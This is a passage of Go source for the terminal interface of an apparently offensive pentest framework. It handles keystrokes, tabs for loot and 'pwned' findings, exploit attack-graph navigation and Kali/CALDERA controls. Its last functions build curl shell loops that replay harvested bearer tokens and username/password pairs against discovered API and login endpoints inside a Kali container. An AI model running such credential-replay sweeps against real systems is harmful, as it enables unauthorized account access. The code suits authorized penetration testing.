			lines = append(lines, "", lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render("enter open/load  |  esc back"))
		}
	default:
		items := startupMenuItems()
		for i, item := range items {
			prefix := "  "
			style := lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
			if i == clamp(m.startupIdx, 0, len(items)-1) {
				prefix = "▸ "
				style = lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true)
			}
			lines = append(lines, style.Render(prefix+item))
		}
		lines = append(lines, "", lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render("up/down select  |  enter confirm  |  q quit"))
	}
	if strings.TrimSpace(m.startupBrowseStatus) != "" {
		lines = append(lines, "", metricLine("status", m.startupBrowseStatus))
	}
	body := lipgloss.NewStyle().
		Border(lipgloss.RoundedBorder()).
		BorderForeground(lipgloss.Color("99")).
		Padding(1, 2).
		Render(strings.Join(lines, "\n"))
	return lipgloss.Place(m.width, m.height, lipgloss.Center, lipgloss.Center, body)
}

func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.WindowSizeMsg:
		m.width = msg.Width
		m.height = msg.Height
		m.ready = true
		m.reload()
		return m, nil
	case tickMsg:
		m.reload()
		return m, tickCmd()
	case spinner.TickMsg:
		var cmd tea.Cmd
		m.spinner, cmd = m.spinner.Update(msg)
		return m, cmd
	case replayResultMsg:
		if msg.Err != nil {
			m.replayStatus = "replay failed :: " + msg.Err.Error()
		} else {
			m.replayStatus = "replay ok :: " + truncate(msg.Command, 56)
		}
		return m, nil
	case controlResultMsg:
		if isNewCampaignControlResult(msg) {
			// Always pivot back to live telemetry view after attempting new campaign.
			m.telemetryDir = detectTelemetryDir(m.root)
			m.replayRunIdx = 0
			m.reload()
		}
		m.controlBusy = false
		m.controlLastLabel = msg.Label
		m.controlLastCommand = msg.Command
		m.controlOutput = sanitizeTerminalOutput(strings.TrimSpace(msg.Output))
		if msg.Err != nil {
			m.controlStatus = "failed :: " + msg.Err.Error()
			m.controlOutcome = "failed"
		} else {
			m.controlStatus = "ok :: " + truncate(msg.Label, 56)
			m.controlOutcome = "success"
			m.applyControlResultSignals(msg)
		}
		m.controlUntil = time.Now().Add(2300 * time.Millisecond)
		m.controlDetailScroll = 0
		m.reload()
		return m, nil
	case taxonomyResultMsg:
		m.taxonomyFireBusy = false
		m.taxonomyFireCommand = msg.Command
		m.taxonomyFireOutput = sanitizeTerminalOutput(strings.TrimSpace(msg.Output))
		if msg.Err != nil {
			m.taxonomyFireStatus = "failed :: " + msg.Err.Error()
			m.taxonomyFireOutcome = "failed"
		} else {
			m.taxonomyFireStatus = "ok :: " + truncate(msg.Label, 56)
			m.taxonomyFireOutcome = "success"
		}
		m.taxonomyFireUntil = time.Now().Add(2300 * time.Millisecond)
		m.reload()
		return m, nil
	case pwnedResultMsg:
		m.pwnedFireBusy = false
		m.pwnedFireCommand = msg.Command
		m.pwnedFireOutput = sanitizeTerminalOutput(strings.TrimSpace(msg.Output))
		if msg.Err != nil {
			m.pwnedFireStatus = "failed :: " + msg.Err.Error()
			m.pwnedFireOutcome = "failed"
		} else {
			m.pwnedFireStatus = "ok :: " + truncate(msg.Label, 56)
			m.pwnedFireOutcome = "success"
		}
		m.pwnedFireUntil = time.Now().Add(2300 * time.Millisecond)
		m.reload()
		return m, nil
	case lootResultMsg:
		m.lootFireBusy = false
		m.lootFireCommand = msg.Command
		m.lootFireOutput = sanitizeTerminalOutput(strings.TrimSpace(msg.Output))
		if msg.Err != nil {
			m.lootFireStatus = "failed :: " + msg.Err.Error()
			m.lootFireOutcome = "failed"
		} else {
			m.lootFireStatus = "ok :: " + truncate(msg.Label, 56)
			m.lootFireOutcome = "success"
			m.applyCredentialFitSignals(msg.Output)
		}
		m.lootFireUntil = time.Now().Add(2300 * time.Millisecond)
		m.reload()
		return m, nil
	case archGraphResultMsg:
		m.archGraphBusy = false
		m.archGraphLastNodeID = strings.TrimSpace(msg.NodeID)
		m.archGraphCommand = msg.Command
		m.archGraphOutput = sanitizeTerminalOutput(strings.TrimSpace(msg.Output))
		m.archGraphLastResult = m.archGraphOutput
		if msg.Err != nil {
			m.archGraphStatus = "failed :: " + msg.Err.Error()
			m.archGraphOutcome = "failed"
		} else {
			m.applyArchEditHints(msg)
			m.applyArchResultSignals(msg)
			m.archGraphStatus = "ok :: " + truncate(msg.Label, 56)
			m.archGraphOutcome = "success"
		}
		m.archGraphUntil = time.Now().Add(2300 * time.Millisecond)
		return m, nil
	case startupResultMsg:
		m.startupBusy = false
		if msg.Err != nil {
			m.startupBrowseStatus = "failed :: " + msg.Err.Error()
			return m, nil
		}
		if strings.EqualFold(strings.TrimSpace(msg.Op), "new-campaign") {
			m.telemetryDir = detectTelemetryDir(m.root)
			m.startupActive = false
			m.startupBrowseStatus = "ok :: fresh campaign started"
			m.reload()
			return m, nil
		}
		return m, nil
	case tea.KeyMsg:
		if m.startupActive {
			return m, m.handleStartupKey(msg)
		}
		if m.confirmNewCampaign && !key.Matches(msg, m.keys.Select) && !key.Matches(msg, m.keys.Fire) {
			m.confirmNewCampaign = false
		}
		if m.manualTargetMode {
			switch msg.String() {
			case "esc":
				m.manualTargetMode = false
				if strings.EqualFold(m.manualTargetKind, "osint") {
					m.controlStatus = "manual OSINT input canceled"
				} else if strings.EqualFold(m.manualTargetKind, "onchain") {
					m.controlStatus = "manual ONCHAIN input canceled"
				} else if strings.EqualFold(m.manualTargetKind, "kali-container") {
					m.controlStatus = "manual kali container input canceled"
				} else if strings.EqualFold(m.manualTargetKind, "kali-image") {
					m.controlStatus = "manual kali image input canceled"
				} else if strings.EqualFold(m.manualTargetKind, "coop-url") {
					m.controlStatus = "manual CO-OP caldera URL canceled"
				} else if strings.EqualFold(m.manualTargetKind, "coop-key") {
					m.controlStatus = "manual CO-OP API key canceled"
				} else if strings.EqualFold(m.manualTargetKind, "coop-operation") {
					m.controlStatus = "manual CO-OP operation name canceled"
				} else if strings.EqualFold(m.manualTargetKind, "coop-agent-group") {
					m.controlStatus = "manual CO-OP agent group canceled"
				} else if strings.EqualFold(m.manualTargetKind, "module-input") {
					m.controlStatus = "module input canceled"
				} else if strings.EqualFold(m.manualTargetKind, "custom-command") {
					m.controlStatus = "manual custom command input canceled"
				} else if strings.EqualFold(m.manualTargetKind, "inner-target") {
					m.controlStatus = "manual inner target input canceled"
				} else if strings.EqualFold(m.manualTargetKind, "brute-manual-cred") {
					m.controlStatus = "manual brute credential input canceled"
				} else if strings.EqualFold(m.manualTargetKind, "brute-manual-token") {
					m.controlStatus = "manual brute token input canceled"
				} else if strings.EqualFold(m.manualTargetKind, "arch-edit-endpoint") {
					m.archGraphStatus = "edit endpoint canceled"
				} else if strings.EqualFold(m.manualTargetKind, "arch-edit-payload") {
					m.archGraphStatus = "edit payload canceled"
				} else if strings.EqualFold(m.manualTargetKind, "arch-edit-field-value") {
					m.archGraphStatus = "field value edit canceled"
				} else {
					m.controlStatus = "manual target input canceled"
				}
				return m, nil
			case "enter":
				if strings.EqualFold(m.manualTargetKind, "osint") {
					return m, m.submitManualOSINTTarget()
				}
				if strings.EqualFold(m.manualTargetKind, "onchain") {
					return m, m.submitManualOnchainTarget()
				}
				if strings.EqualFold(m.manualTargetKind, "kali-container") {
					return m, m.submitManualKaliContainer()
				}
				if strings.EqualFold(m.manualTargetKind, "kali-image") {
					return m, m.submitManualKaliImage()
				}
				if strings.EqualFold(m.manualTargetKind, "coop-url") {
					return m, m.submitManualCoopCalderaURL()
				}
				if strings.EqualFold(m.manualTargetKind, "coop-key") {
					return m, m.submitManualCoopCalderaAPIKey()
				}
				if strings.EqualFold(m.manualTargetKind, "coop-operation") {
					return m, m.submitManualCoopOperationName()
				}
				if strings.EqualFold(m.manualTargetKind, "coop-agent-group") {
					return m, m.submitManualCoopAgentGroup()
				}
				if strings.EqualFold(m.manualTargetKind, "custom-command") {
					return m, m.submitManualCustomCommand()
				}
				if strings.EqualFold(m.manualTargetKind, "inner-target") {
					return m, m.submitManualInnerTarget()
				}
				if strings.EqualFold(m.manualTargetKind, "brute-manual-cred") {
					return m, m.submitManualBruteCredential()
				}
				if strings.EqualFold(m.manualTargetKind, "brute-manual-token") {
					return m, m.submitManualBruteToken()
				}
				if strings.EqualFold(m.manualTargetKind, "module-input") {
					return m, m.submitManualModuleInput()
				}
				if strings.EqualFold(m.manualTargetKind, "arch-edit-endpoint") {
					return m, m.submitManualArchEditEndpoint()
				}
				if strings.EqualFold(m.manualTargetKind, "arch-edit-payload") {
					return m, m.submitManualArchEditPayload()
				}
				if strings.EqualFold(m.manualTargetKind, "arch-edit-field-value") {
					return m, m.submitManualArchEditFieldValue()
				}
				return m, m.submitManualTarget()
			case "backspace", "ctrl+h":
				runes := []rune(m.manualTargetInput)
				if len(runes) > 0 {
					m.manualTargetInput = string(runes[:len(runes)-1])
				}
				return m, nil
			}
			if len(msg.Runes) > 0 {
				m.manualTargetInput += string(msg.Runes)
			}
			return m, nil
		}
		switch {
		case msg.String() >= "1" && msg.String() <= "5":
			m.tab = int(msg.String()[0] - '1')
			m.resetDetailScroll()
			m.taxonomySubMode = false
			m.taxonomySubIdx = 0
		case key.Matches(msg, m.keys.Quit):
			return m, tea.Quit
		case key.Matches(msg, m.keys.Refresh):
			m.reload()
		case key.Matches(msg, m.keys.NextPane):
			if m.tab == 0 && m.archMapMode && strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
				m.cycleArchEditableField(1)
				return m, nil
			}
			if m.tab == 4 {
				m.controlSection = (m.controlSection + 1) % 4
				if m.controlSection != 2 {
					m.exploitPipelineMenu = false
				}
				m.controlDetailScroll = 0
			}
		case key.Matches(msg, m.keys.PrevPane):
			if m.tab == 0 && m.archMapMode && strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
				m.cycleArchEditableField(-1)
				return m, nil
			}
			if m.tab == 4 {
				m.controlSection = (m.controlSection + 3) % 4
				if m.controlSection != 2 {
					m.exploitPipelineMenu = false
				}
				m.controlDetailScroll = 0
			}
		case key.Matches(msg, m.keys.NextOption):
			if m.tab == 0 && m.archMapMode && strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
				m.cycleArchGraphAction(1)
			}
			if m.tab == 3 && !m.lootFogMode {
				if actions := lootFollowupActionsForSelection(m.loot, m.lootIdx, m.state.TargetURL, m.root); len(actions) > 0 {
					m.lootActionIdx = (m.lootActionIdx + 1) % len(actions)
				}
			}
			if m.tab == 3 && m.lootFogMode {
				if actions := m.lootFogStageActions(); len(actions) > 0 {
					m.lootFogActionIdx = (m.lootFogActionIdx + 1) % len(actions)
				}
			}
			if m.tab == 4 {
				switch m.controlSection {
				case 0:
					if actions := m.launchActions(); len(actions) > 0 {
						m.launchIdx = (m.launchIdx + 1) % len(actions)
					}
				case 1:
					if actions := m.targetActions(); len(actions) > 0 {
						m.targetIdx = (m.targetIdx + 1) % len(actions)
					}
				case 2:
					if actions := m.fireActions(); len(actions) > 0 {
						m.fireIdx = (m.fireIdx + 1) % len(actions)
					}
				case 3:
					if actions := m.historyActions(); len(actions) > 0 {
						m.historyIdx = (m.historyIdx + 1) % len(actions)
					}
				}
			}
		case key.Matches(msg, m.keys.PrevOption):
			if m.tab == 0 && m.archMapMode && strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
				m.cycleArchGraphAction(-1)
			}
			if m.tab == 3 && !m.lootFogMode {
				if actions := lootFollowupActionsForSelection(m.loot, m.lootIdx, m.state.TargetURL, m.root); len(actions) > 0 {
					m.lootActionIdx = (m.lootActionIdx + len(actions) - 1) % len(actions)
				}
			}
			if m.tab == 3 && m.lootFogMode {
				if actions := m.lootFogStageActions(); len(actions) > 0 {
					m.lootFogActionIdx = (m.lootFogActionIdx + len(actions) - 1) % len(actions)
				}
			}
			if m.tab == 4 {
				switch m.controlSection {
				case 0:
					if actions := m.launchActions(); len(actions) > 0 {
						m.launchIdx = (m.launchIdx + len(actions) - 1) % len(actions)
					}
				case 1:
					if actions := m.targetActions(); len(actions) > 0 {
						m.targetIdx = (m.targetIdx + len(actions) - 1) % len(actions)
					}
				case 2:
					if actions := m.fireActions(); len(actions) > 0 {
						m.fireIdx = (m.fireIdx + len(actions) - 1) % len(actions)
					}
				case 3:
					if actions := m.historyActions(); len(actions) > 0 {
						m.historyIdx = (m.historyIdx + len(actions) - 1) % len(actions)
					}
				}
			}
		case key.Matches(msg, m.keys.Right):
			if m.tab == 0 && m.archMapMode && strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
				if msg.String() == "l" {
					if m.expandArchSelected() {
						return m, nil
					}
				}
				m.moveArchGraph("right")
			} else {
				m.tab = (m.tab + 1) % 5
				m.resetDetailScroll()
			}
		case key.Matches(msg, m.keys.Left):
			if m.tab == 0 && m.archMapMode && strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
				if msg.String() == "h" {
					if m.collapseArchSelected() {
						return m, nil
					}
				}
				m.moveArchGraph("left")
			} else {
				m.tab = (m.tab + 4) % 5
				m.resetDetailScroll()
			}
		case key.Matches(msg, m.keys.Up):
			if m.tab == 0 && m.archMapMode && strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
				m.moveArchGraph("up")
			} else {
				m.move(-1)
			}
		case key.Matches(msg, m.keys.Down):
			if m.tab == 0 && m.archMapMode && strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
				m.moveArchGraph("down")
			} else {
				m.move(1)
			}
		case key.Matches(msg, m.keys.ScrollUp):
			m.scrollDetail(-1)
		case key.Matches(msg, m.keys.ScrollDown):
			m.scrollDetail(1)
		case key.Matches(msg, m.keys.Select):
			if m.tab == 0 && m.archMapMode && strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
				m.previewArchSelectedAction()
				return m, nil
			}
			if m.tab == 2 {
				return m, m.submitPwnedAction()
			}
			if m.tab == 3 && !m.lootFogMode {
				return m, m.submitLootAction()
			}
			if m.tab == 3 && m.lootFogMode {
				return m, m.submitLootFogAction()
			}
			if m.tab == 4 {
				return m, m.triggerControlAction()
			}
		case key.Matches(msg, m.keys.Fire):
			if m.tab == 0 && m.archMapMode && strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
				return m, m.triggerArchGraphAction()
			}
			if m.tab == 2 {
				return m, m.submitPwnedAction()
			}
			if m.tab == 3 && !m.lootFogMode {
				return m, m.submitLootAction()
			}
			if m.tab == 3 && m.lootFogMode {
				return m, m.submitLootFogAction()
			}
		case msg.String() == "e" || msg.String() == "E":
			if m.tab == 0 && m.archMapMode && strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
				m.startArchEditInput("endpoint")
				return m, nil
			}
		case msg.String() == "p" || msg.String() == "P":
			if m.tab == 0 && m.archMapMode && strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
				m.startArchEditInput("payload")
				return m, nil
			}
		case msg.String() == "y" || msg.String() == "Y":
			if m.tab == 0 && m.archMapMode && strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
				m.cycleArchEditMethod(1)
				return m, nil
			}
		case msg.String() == "t" || msg.String() == "T":
			if m.tab == 0 && m.archMapMode && strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
				m.archEditUseToken = !m.archEditUseToken
				m.archEditEnabled = true
				m.archGraphStatus = "edit auth header :: " + ternary(m.archEditUseToken, "ON", "OFF")
				return m, nil
			}
		case msg.String() == "i" || msg.String() == "I":
			if m.tab == 0 && m.archMapMode && strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
				m.startArchEditFieldValueInput()
				return m, nil
			}
		case len(msg.String()) == 1 && msg.String()[0] >= '1' && msg.String()[0] <= '9':
			if m.tab == 0 && m.archMapMode && strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
				if m.selectArchActionByNumber(int(msg.String()[0] - '1')) {
					return m, nil
				}
			}
		case msg.String() == "o" || msg.String() == "O":
			m.applyModeHotkey()
		case msg.String() == "c" || msg.String() == "C":
			m.applyChainHotkey()
		case msg.String() == "g" || msg.String() == "G":
			m.applyCoopHotkey()
		case key.Matches(msg, m.keys.ModeToggle):
			m.applyModeHotkey()
		case key.Matches(msg, m.keys.ChainToggle):
			m.applyChainHotkey()
		case key.Matches(msg, m.keys.CoopToggle):
			m.applyCoopHotkey()
		case msg.String() == "m" || msg.String() == "M":
			m.applyMapHotkey()
		case key.Matches(msg, m.keys.MapToggle):
			m.applyMapHotkey()
		case key.Matches(msg, m.keys.Replay):
			if m.tab == 1 && len(m.commands) > 0 {
				cmd := m.commands[m.commandIdx].Command
				m.replayStatus = "replaying :: " + truncate(cmd, 56)
				return m, replayCmd(cmd)
			}
		case key.Matches(msg, m.keys.RawToggle):
			if m.tab == 3 {
				m.lootRawMode = !m.lootRawMode
				m.lootDetailScroll = 0
			} else if m.tab == 0 && m.archMapMode && strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
				m.archOutputRaw = !m.archOutputRaw
				m.commandDetailScroll = 0
			}
		}
	}
	return m, nil
}

func isNewCampaignControlResult(msg controlResultMsg) bool {
	meta := strings.ToLower(strings.TrimSpace(msg.Command + " " + msg.Label))
	return strings.Contains(meta, "telemetryctl.py new-campaign") || strings.Contains(meta, "start new campaign")
}

func (m *model) move(delta int) {
	switch m.tab {
	case 0:
		if strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
			exploitCommands := commandsByMode(m.commands, "exploit")
			exploitFindings := findingsByMode(m.findings, "exploit")
			exploitLoot := lootByMode(m.loot, "exploit")
			if nodes := buildExploitAttackGraph(m.state, exploitCommands, exploitFindings, exploitLoot); len(nodes) > 0 {
				m.archGraphIdx = clampWrap(m.archGraphIdx+delta, len(nodes))
				m.commandDetailScroll = 0
			}
		}
	case 1:
		if len(m.commands) > 0 {
			mode := strings.ToLower(strings.TrimSpace(m.fireMode))
			if mode == "" {
				mode = "exploit"
			}
			order := commandDisplayOrderByMode(m.commands, mode)
			if len(order) > 0 {
				pos := indexInOrder(order, m.commandIdx)
				if pos < 0 {
					pos = 0
				}
				pos = clamp(pos+delta, 0, len(order)-1)
				m.commandIdx = order[pos]
			} else {
				m.commandIdx = clamp(m.commandIdx+delta, 0, len(m.commands)-1)
			}
			m.commandDetailScroll = 0
		}
	case 2:
		if len(m.findings) > 0 {
			mode := strings.ToLower(strings.TrimSpace(m.fireMode))
			if mode == "" {
				mode = "exploit"
			}
			order := findingDisplayOrderByMode(m.findings, mode)
			if len(order) > 0 {
				pos := indexInOrder(order, m.findingIdx)
				if pos < 0 {
					pos = 0
				}
				pos = clamp(pos+delta, 0, len(order)-1)
				m.findingIdx = order[pos]
			} else {
				m.findingIdx = clamp(m.findingIdx+delta, 0, len(m.findings)-1)
			}
			m.findingDetailScroll = 0
		}
	case 3:
		if m.lootFogMode {
			if len(lootFogVisualOrder) > 0 {
				m.lootFogStageIdx = clamp(m.lootFogStageIdx+delta, 0, len(lootFogVisualOrder)-1)
				m.lootFogActionIdx = 0
			}
			m.lootDetailScroll = 0
			return
		}
		if len(m.loot) > 0 {
			order := lootDisplayOrderByMode(m.loot, m.lootOSINTMode, m.lootOnchainMode)
			if len(order) > 0 {
				pos := 0
				for i, idx := range order {
					if idx == m.lootIdx {
						pos = i
						break
					}
				}
				pos = clamp(pos+delta, 0, len(order)-1)
				m.lootIdx = order[pos]
			} else {
				m.lootIdx = clamp(m.lootIdx+delta, 0, len(m.loot)-1)
			}
			m.lootDetailScroll = 0
			m.lootRawMode = false
			m.lootActionIdx = 0
		}
	case 4:
		switch m.controlSection {
		case 0:
			actions := m.launchActions()
			if len(actions) > 0 {
				m.launchIdx = clamp(m.launchIdx+delta, 0, len(actions)-1)
			}
		case 1:
			actions := m.targetActions()
			if len(actions) > 0 {
				m.targetIdx = clamp(m.targetIdx+delta, 0, len(actions)-1)
			}
		case 2:
			if strings.EqualFold(m.fireMode, "exploit") {
				groups := exploitFireGroups()
				if len(groups) > 0 {
					m.exploitFireGroupIdx = clampWrap(m.exploitFireGroupIdx+delta, len(groups))
					m.exploitPipelineMenu = false
					m.fireIdx = 0
				}
			} else {
				actions := m.fireActions()
				if len(actions) > 0 {
					m.fireIdx = clamp(m.fireIdx+delta, 0, len(actions)-1)
				}
			}
		case 3:
			actions := m.historyActions()
			if len(actions) > 0 {
				m.historyIdx = clamp(m.historyIdx+delta, 0, len(actions)-1)
			}
		default:
			m.controlSection = 0
		}
	}
}

func (m *model) moveArchGraph(direction string) {
	nodes := m.exploitGraphNodes()
	if len(nodes) == 0 {
		return
	}
	if m.archCollapsed == nil {
		m.archCollapsed = map[string]bool{}
	}
	current := clampWrap(m.archGraphIdx, len(nodes))
	children := buildGraphChildrenIndex(nodes)
	currentNode := nodes[current]
	if strings.EqualFold(direction, "left") {
		if len(children[currentNode.ID]) > 0 && !m.archCollapsed[currentNode.ID] {
			m.archCollapsed[currentNode.ID] = true
			m.archGraphStatus = "collapsed :: " + currentNode.Label
			return
		}
	}
	if strings.EqualFold(direction, "right") {
		if len(children[currentNode.ID]) > 0 && m.archCollapsed[currentNode.ID] {
			delete(m.archCollapsed, currentNode.ID)
			m.archGraphStatus = "expanded :: " + currentNode.Label
		}
	}
	next := graphMoveIndex(nodes, m.archCollapsed, current, direction)
	if next != current {
		m.archGraphIdx = next
		m.archGraphActionIdx = 0
		m.commandDetailScroll = 0
	}
}

func (m *model) moveArchMapTaxonomy(delta int) {
	nodes := exploitSkullMapNodes()
	if len(nodes) == 0 {
		m.archMapTaxIdx = 0
		return
	}
	m.archMapTaxIdx = clampWrap(m.archMapTaxIdx+delta, len(nodes))
	m.archGraphIdx = 0
	m.archGraphActionIdx = 0
	m.commandDetailScroll = 0
	selected := nodes[m.archMapTaxIdx]
	m.archGraphStatus = "taxonomy :: " + selected.ZoneLabel + " / " + selected.SubLabel
}

func (m model) exploitGraphNodes() []attackGraphNode {
	exploitCommands := commandsByMode(m.commands, "exploit")
	exploitFindings := findingsByMode(m.findings, "exploit")
	exploitLoot := lootByMode(m.loot, "exploit")
	return buildExploitAttackGraph(m.state, exploitCommands, exploitFindings, exploitLoot)
}

func (m model) archGraphActionsForNode(node attackGraphNode) []controlAction {
	exploitLoot := lootByMode(m.loot, "exploit")
	actions := exploitGraphNodeActions(node, m.state, exploitLoot, m.root)
	if fitAction, ok := m.archCredentialFitScanAction(node); ok {
		actions = append([]controlAction{fitAction}, actions...)
	}
	actions = append(actions, m.archGraphRecordEditActions(node)...)
	if len(actions) == 0 {
		fallback := exploitGraphNodeAction(node, m.state, m.root)
		if strings.TrimSpace(fallback.Command) != "" || strings.TrimSpace(fallback.KaliShell) != "" {
			actions = append(actions, fallback)
		}
	}
	return actions
}

func buildCredentialFitScanShell(endpoints []string, token, user, pass string) string {
	quoted := make([]string, 0, len(endpoints))
	for _, endpoint := range endpoints {
		trimmed := strings.TrimSpace(endpoint)
		if trimmed == "" {
			continue
		}
		quoted = append(quoted, shellQuote(trimmed))
	}
	if len(quoted) == 0 {
		return "echo 'no endpoints for credential fit scan'; exit 1"
	}
	shell := "token=" + shellQuote(token) + "; user=" + shellQuote(user) + "; pass=" + shellQuote(pass) + "; hits=0; " +
		"for ep in " + strings.Join(quoted, " ") + "; do " +
		"base=$(curl -sS -k -o /dev/null -w '%{http_code}' \"$ep\"); changed=0; line=\"endpoint=$ep baseline=$base\"; " +
		"if [ -n \"$token\" ]; then bearer=$(curl -sS -k -o /dev/null -w '%{http_code}' \"$ep\" -H \"Authorization: Bearer $token\"); line=\"$line bearer=$bearer\"; " +
		"if [ \"$bearer\" != \"$base\" ] || { [ \"$bearer\" -ge 200 ] 2>/dev/null && [ \"$bearer\" -lt 400 ] 2>/dev/null; }; then changed=1; fi; fi; " +
		"if [ -n \"$user\" ] && [ -n \"$pass\" ]; then basic=$(curl -sS -k -o /dev/null -w '%{http_code}' \"$ep\" -u \"$user:$pass\"); line=\"$line basic=$basic\"; " +
		"if [ \"$basic\" != \"$base\" ] || { [ \"$basic\" -ge 200 ] 2>/dev/null && [ \"$basic\" -lt 400 ] 2>/dev/null; }; then changed=1; fi; fi; " +
		"if [ \"$changed\" -eq 1 ]; then echo \"CRED_FIT $line\"; hits=$((hits+1)); else echo \"NOFIT $line\"; fi; " +
		"done; echo \"CRED_FIT_TOTAL=$hits\""
	return shell
}

func buildEndpointProbeShell(endpoints []string) string {
	quoted := make([]string, 0, len(endpoints))
	seen := map[string]bool{}
	for _, endpoint := range endpoints {
		trimmed := strings.TrimSpace(endpoint)
		if trimmed == "" {
			continue
		}
		key := strings.ToLower(trimmed)
		if seen[key] {
			continue
		}
		seen[key] = true
		quoted = append(quoted, shellQuote(trimmed))
	}
	if len(quoted) == 0 {
		return "echo 'no discovered endpoints to probe'; exit 1"
	}
	return "for ep in " + strings.Join(quoted, " ") + "; do echo \"== $ep ==\"; curl -sS -i \"$ep\" | head -n 12; echo; done"
}

func credentialFitScanDescription(token string, hasPair bool) string {
	description := "Test discovered credential material across mapped endpoints to identify auth fit."
	if token != "" && hasPair {
		description += " Uses bearer token + basic pair."
	} else if token != "" {
		description += " Uses bearer token."
	} else if hasPair {
		description += " Uses basic credential pair."
	}
	return description
}

func isCredentialSignalMeta(meta string) bool {
	lower := strings.ToLower(strings.TrimSpace(meta))
	if lower == "" {
		return false
	}
	markers := []string{"credential", "creds", "password", "passwd", "login", "auth", "token", "jwt", "bearer", "api key", "apikey", "secret"}
	for _, marker := range markers {
		if strings.Contains(lower, marker) {
			return true
		}
	}
	return false
}

func lootCredentialFitEndpoints(root, targetURL string, seed lootEntry) []string {
	state := loadState(filepath.Join(root, "telemetry", "state.json"))
	if strings.TrimSpace(state.TargetURL) == "" {
		state.TargetURL = strings.TrimSpace(targetURL)
	}
	base := strings.TrimSpace(state.TargetURL)
	if base == "" {
		return nil
	}
	allLoot := loadJSONL[lootEntry](filepath.Join(root, "telemetry", "loot.jsonl"))
	allFindings := loadJSONL[findingEntry](filepath.Join(root, "telemetry", "findings.jsonl"))
	allLoot = append(allLoot, seed)
	exploitLoot := lootByMode(allLoot, "exploit")
	exploitFindings := findingsByMode(allFindings, "exploit")
	out := []string{}
	seen := map[string]bool{}
	add := func(raw string) {
		trimmed := strings.TrimSpace(raw)
		if trimmed == "" {
			return
		}
		normalized := normalizeLootEndpoint(base, trimmed)
		if strings.TrimSpace(normalized) == "" {
			return
		}
		rebased := rebaseEndpointForKali(normalized, state)
		if strings.TrimSpace(rebased) == "" {
			return
		}
		key := strings.ToLower(strings.TrimSpace(rebased))
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, rebased)
	}
	add(seed.Source)
	for _, endpoint := range exploitAPIDiscovery(exploitFindings, exploitLoot, base) {
		add(endpoint)
	}
	for _, endpoint := range exploitInnerTargets(exploitFindings, exploitLoot, base) {
		lower := strings.ToLower(strings.TrimSpace(endpoint))
		if strings.Contains(lower, "/api/") ||
			strings.Contains(lower, "/rest/") ||
			strings.Contains(lower, "/login") ||
			strings.Contains(lower, "/auth") ||
			strings.Contains(lower, "/oauth") {
			add(endpoint)
		}
	}
	if len(out) > 24 {
		out = out[:24]
	}
	return out
}

func lootCredentialFitAction(item lootEntry, targetURL, root string) (controlAction, bool) {
	meta := strings.ToLower(item.Kind + " " + item.Name + " " + item.Source + " " + item.Preview)
	if !isCredentialSignalMeta(meta) {
		return controlAction{}, false
	}
	endpoints := lootCredentialFitEndpoints(root, targetURL, item)
	if len(endpoints) == 0 {
		return controlAction{}, false
	}
	allLoot := loadJSONL[lootEntry](filepath.Join(root, "telemetry", "loot.jsonl"))
	allLoot = append(allLoot, item)
	pairs := extractCredentialPairsFromLoot(lootByMode(allLoot, "exploit"))
	token := strings.TrimSpace(latestTokenFromTelemetry(root))
	if token == "" && len(pairs) == 0 {
		return controlAction{}, false
	}
	user := ""
	pass := ""
	if len(pairs) > 0 {
		user = pairs[0].User
		pass = pairs[0].Pass
	}
	shell := buildCredentialFitScanShell(endpoints, token, user, pass)
	return controlAction{
		Label:       "Loot Action :: credential fit sweep",
		Description: credentialFitScanDescription(token, len(pairs) > 0),
		Mode:        "kali",
		Command:     "docker exec h3retik-kali bash -lc " + shellQuote(shell),
		KaliShell:   shell,
	}, true
}

func (m model) archCredentialFitScanAction(node attackGraphNode) (controlAction, bool) {
	kind := strings.ToLower(strings.TrimSpace(node.Kind))
	if kind != "auth" && kind != "endpoint" && kind != "collection" && kind != "record" && strings.TrimSpace(node.ID) != "api" {
		return controlAction{}, false
	}
	exploitLoot := lootByMode(m.loot, "exploit")
	exploitFindings := findingsByMode(m.findings, "exploit")
	endpointSet := map[string]bool{}
	endpoints := []string{}
	addEndpoint := func(raw string) {
		trimmed := strings.TrimSpace(raw)
		if trimmed == "" {
			return
		}
		normalized := rebaseEndpointForKali(trimmed, m.state)
		if strings.TrimSpace(normalized) == "" {
			return
		}
		key := strings.ToLower(strings.TrimSpace(normalized))
		if endpointSet[key] {
			return
		}
		endpointSet[key] = true
		endpoints = append(endpoints, normalized)
	}
	if kind == "endpoint" || kind == "collection" || kind == "record" {
		addEndpoint(node.Ref)
	}
	for _, endpoint := range exploitAPIDiscovery(exploitFindings, exploitLoot, m.state.TargetURL) {
		addEndpoint(endpoint)
		if len(endpoints) >= 12 {
			break
		}
	}
	if len(endpoints) == 0 {
		return controlAction{}, false
	}
	token := strings.TrimSpace(latestTokenFromTelemetry(m.root))
	pairs := extractCredentialPairsFromLoot(exploitLoot)
	if token == "" && len(pairs) == 0 {
		return controlAction{}, false
	}
	user := ""
	pass := ""
	if len(pairs) > 0 {
		user = pairs[0].User
		pass = pairs[0].Pass
	}
	shell := buildCredentialFitScanShell(endpoints, token, user, pass)
	description := credentialFitScanDescription(token, len(pairs) > 0)
